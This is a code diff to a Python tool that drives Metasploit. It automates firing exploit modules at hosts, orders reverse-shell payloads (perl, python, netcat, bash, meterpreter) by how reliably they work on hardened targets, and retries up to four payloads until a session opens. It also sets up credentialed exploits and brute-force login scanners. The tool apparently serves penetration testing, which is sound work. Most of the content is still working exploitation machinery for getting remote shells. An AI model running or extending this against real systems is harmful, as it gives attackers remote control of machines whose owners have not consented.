@@ -186,6 +186,11 @@ class MsfConfig:
     username: str = "msf"
     aux_timeout: int = 120           # per-module cap for auxiliary/unauth runs
     exploit_timeout: int = 90
+    # How many compatible payloads to try per exploit before giving up. The first
+    # is the best pick; on a clean no_session the next is tried, since a target may
+    # execute the module but be unable to run that payload (for example bash with no
+    # /dev/tcp). 1 disables fallback.
+    payload_retries: int = 4
     brute_timeout: int = 600        # per-service login scanner cap
     brute_threads: int = 8          # parallel attempts within one login scanner
     cred_user: str = ""             # default USERNAME for credentialed exploits
@@ -515,11 +520,16 @@ class MsfClient:
         return data
 
     def fire(self, candidate, host, rhost, port):
-        """Detonate the module against rhost with a selected reverse payload.
-        Returns (session, status, detail). status is one of:
+        """Detonate the module against rhost, trying compatible payloads in
+        reliability order until one calls back. Returns (session, status, detail).
+        status is one of:
           session    - a session opened
-          no_session - the module fired (execute was accepted) but nothing called
-                       back within the timeout. This is the only clean negative.
+          no_session - the module fired for every payload tried (execute accepted)
+                       but nothing called back within the timeout. The only clean
+                       negative. A target may execute the module yet be unable to
+                       run a given payload (bash with no /dev/tcp, missing perl),
+                       so up to cfg.payload_retries payloads are tried before this
+                       is returned.
           blocked    - no fair attempt was made: an option we needed was unset or
                        rejected, no compatible payload, no derivable LHOST, the
                        LPORT pool was empty, or MSF refused to run the module.
@@ -527,18 +537,45 @@ class MsfClient:
         Only no_session means the target got a real attempt and did not yield;
         every other non-session status flags a tooling gap to review, so a real
         flaw is never buried under a generic failure. detail carries the reason.
-        The handler job is always stopped in teardown, which frees the LPORT and
-        leaves any session intact."""
+        Each attempt stops its own handler job and frees its LPORT in teardown."""
+        try:
+            modref = _strip_type(candidate.module)
+            exploit = self._client.modules.use("exploit", modref)
+            payloads = _select_payloads(exploit, candidate.module, host)
+        except Exception as e:
+            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
+            return None, "error", f"fire error: {e}"
+        if not payloads:
+            return self._blocked(candidate, rhost, "no compatible payload")
+        cap = max(1, getattr(self.cfg, "payload_retries", 4))
+        attempts = payloads[:cap]
+        last = (None, "no_session", "fired, no session within timeout")
+        for i, payload_name in enumerate(attempts):
+            session, status, detail = self._fire_once(
+                candidate, host, rhost, port, exploit, payload_name)
+            if status == "session":
+                return session, status, detail
+            if status == "blocked":
+                # option/setup gap; a different payload will not help. Stop here.
+                return session, status, detail
+            # no_session or error: try the next payload if any remain
+            last = (session, status, detail)
+            if status == "no_session" and i + 1 < len(attempts):
+                nxt = attempts[i + 1]
+                logger.info("fire %s @ %s: %s did not call back, retrying with %s",
+                            candidate.module, rhost, payload_name, nxt)
+        return last
+
+    def _fire_once(self, candidate, host, rhost, port, exploit, payload_name):
+        """One fire attempt with a specific payload. Acquires and releases its own
+        LPORT and stops its own handler job. Returns the same (session, status,
+        detail) contract as fire. Separated so fire can retry across payloads
+        without re-resolving the exploit or leaking ports and jobs between tries."""
         lport = self._lport_acquire()
         if lport is None:
             return self._blocked(candidate, rhost, "LPORT pool exhausted")
         job_id = None
         try:
-            modref = _strip_type(candidate.module)
-            exploit = self._client.modules.use("exploit", modref)
-            payload_name = _select_payload(exploit, candidate.module, host)
-            if payload_name is None:
-                return self._blocked(candidate, rhost, "no compatible payload")
             payload = self._client.modules.use("payload", payload_name)
             lhost = self.cfg.lhost or _lhost_for(rhost)
             if not lhost:
@@ -600,7 +637,8 @@ class MsfClient:
             job_id = result.get("job_id")
             matched = self._await_session(uuid, self.cfg.exploit_timeout)
             if matched is None:
-                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
+                logger.info("fire %s @ %s payload=%s -> no session",
+                            candidate.module, rhost, payload_name)
                 return None, "no_session", "fired, no session within timeout"
             sid, sdict = matched
             logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
@@ -913,12 +951,19 @@ def _payload_prefs(platform, x64):
             "osx/x64/shell_reverse_tcp",
         ]
     elif platform == "unix":
+        # Order by reliability on old and hardened targets. Interpreter payloads
+        # (perl, python) are almost always present and need no shell networking
+        # features. netcat and telnet (cmd/unix/reverse) follow. reverse_bash is
+        # LAST: it depends on bash /dev/tcp, which many targets (older
+        # Metasploitable-era bash, dash, bash built without net redirections)
+        # do not provide, so it fires but the callback never opens.
         prefs += [
-            "cmd/unix/reverse_bash",
-            "cmd/unix/reverse",
-            "cmd/unix/reverse_netcat",
-            "cmd/unix/reverse_python",
             "cmd/unix/reverse_perl",
+            "cmd/unix/reverse_python",
+            "cmd/unix/reverse_netcat",
+            "cmd/unix/reverse_openssl",
+            "cmd/unix/reverse",
+            "cmd/unix/reverse_bash",
         ]
     elif platform == "java":
         prefs += ["java/jsp_shell_reverse_tcp"]
@@ -930,8 +975,9 @@ def _payload_prefs(platform, x64):
     # module offering only meterpreter plus a generic shell still proves execution
     # with the shell. Meterpreter platform payloads are appended last as the true
     # last resort for modules that offer nothing else.
-    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_bash",
-              "cmd/unix/reverse", "cmd/unix/reverse_netcat"]
+    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_perl",
+              "cmd/unix/reverse_python", "cmd/unix/reverse_netcat",
+              "cmd/unix/reverse", "cmd/unix/reverse_bash"]
     if platform == "windows":
         if x64:
             prefs += ["windows/x64/meterpreter/reverse_tcp",
@@ -949,35 +995,53 @@ def _payload_prefs(platform, x64):
     return prefs
 
 
-def _select_payload(exploit, full_module, host):
-    """Pick the best reverse payload from the module's compatible set, matched to
-    platform/arch. Falls back to any reverse payload, then warns and takes the
-    first compatible payload (likely bind) only as a last resort."""
+def _select_payloads(exploit, full_module, host):
+    """Return compatible reverse payloads for this module in reliability order,
+    best first. This is the ordered form of _select_payload used by the fire
+    fallback: if the first payload fires but never calls back, the next is tried.
+    Preference order comes first (platform command shells, then generic, then
+    meterpreter), followed by any remaining reverse payloads, with bind payloads
+    last. Returns [] when the module exposes no payloads."""
     try:
         compat = set(exploit.payloads or [])
     except Exception as e:
         logger.warning("could not list payloads for %s: %s", full_module, e)
-        compat = set()
+        return []
     if not compat:
-        return None
+        return []
     platform = _platform_from_module(full_module) or _platform_from_host(host)
     x64 = _is_x64(host)
+    ordered = []
+    seen = set()
     for p in _payload_prefs(platform, x64):
-        if p in compat:
-            return p
-    # prefs did not match; prefer a shell reverse payload over meterpreter, then
-    # any reverse payload, so proving execution still takes precedence.
-    shells = sorted(p for p in compat
-                    if "reverse" in p and "bind" not in p and "meterpreter" not in p)
-    if shells:
-        return shells[0]
-    for p in sorted(compat):
-        if "reverse" in p and "bind" not in p:
-            return p
-    fallback = sorted(compat)[0]
-    logger.warning("no reverse payload for %s; falling back to %s",
-                   full_module, fallback)
-    return fallback
+        if p in compat and p not in seen:
+            ordered.append(p)
+            seen.add(p)
+    # remaining reverse (non-bind) payloads the prefs did not name, shells first
+    rest_shell = sorted(p for p in compat if p not in seen
+                        and "reverse" in p and "bind" not in p
+                        and "meterpreter" not in p)
+    rest_rev = sorted(p for p in compat if p not in seen
+                      and "reverse" in p and "bind" not in p)
+    for p in rest_shell + rest_rev:
+        if p not in seen:
+            ordered.append(p)
+            seen.add(p)
+    # bind and anything else last, so a callback-based payload is always tried first
+    if not ordered:
+        tail = sorted(compat)
+        if tail:
+            logger.warning("no reverse payload for %s; falling back to %s",
+                           full_module, tail[0])
+            return tail[:1]
+    return ordered
+
+
+def _select_payload(exploit, full_module, host):
+    """Pick the single best reverse payload (first of _select_payloads). Kept for
+    callers that want one payload without the fallback loop."""
+    ordered = _select_payloads(exploit, full_module, host)
+    return ordered[0] if ordered else None
 
 
 def _is_user_opt(name):
